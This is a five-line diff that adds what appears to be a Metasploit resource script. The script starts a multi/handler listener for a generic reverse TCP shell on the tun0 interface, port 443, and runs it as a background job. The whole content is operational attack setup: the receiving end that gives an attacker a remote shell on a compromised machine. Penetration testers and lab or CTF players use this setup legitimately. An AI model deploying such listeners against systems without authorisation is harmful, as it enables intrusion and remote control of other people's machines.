@@ -1,0 +1,5 @@
+use multi/handler
+set payload generic/shell_reverse_tcp
+set LHOST tun0
+set LPORT 443
+run -j
